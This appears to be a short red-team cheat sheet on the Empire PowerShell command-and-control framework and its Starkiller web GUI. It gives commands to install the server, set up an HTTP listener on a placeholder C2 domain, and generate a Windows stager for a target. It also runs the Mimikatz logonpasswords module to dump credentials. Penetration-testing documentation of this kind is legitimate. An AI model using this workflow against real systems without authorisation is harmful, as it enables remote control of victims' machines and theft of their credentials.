# 05.01 Empire and Starkiller

> PowerShell C2 framework — pure PowerShell agents, listeners, modules; Starkiller is the GUI.

## Overview

Empire (BC Security fork) is PowerShell-based C2 — agents written in PowerShell, Python, C#. Multi-platform listeners. Comes with a large module library (privesc, lateral movement, persistence, cred dump). Starkiller is a web GUI for managing Empire. Good for engagements where PowerShell-based C2 is preferred over compiled implants.

## Steps

* **Step 1** - Install Empire from GitHub.
* **Step 2** - Start empireserver.
* **Step 3** - Connect via empire client or Starkiller GUI.
* **Step 4** - Configure listener → generate stager → execute on target.

## Commands

### Install

```bash
git clone --recursive https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh
sudo ./ps-empire server
```

### Empire client

```bash
sudo ./ps-empire client
# default creds in empire.yaml — change them!
```

### Listener setup

```bash
(Empire) > uselistener http
(Empire: usestener/http) > set Host https://<C2-DOMAIN>
(Empire: usestener/http) > set Port 443
(Empire: usestener/http) > execute
```

### Generate stager

```bash
(Empire) > usestager windows/launcher_bat
(Empire: usestager/windows/launcher_bat) > set Listener http
(Empire: usestager/windows/launcher_bat) > execute
```

### Run module

```bash
(Empire) > interact <AGENT>
(Empire: <AGENT>) > usemodule powershell/credentials/mimikatz/logonpasswords
(Empire: ...) > execute
```

### Starkiller (web GUI)

```bash
# Download from BC-SECURITY/Starkiller releases
./Starkiller-2.x.x.AppImage
# Connect to http://localhost:1337
```
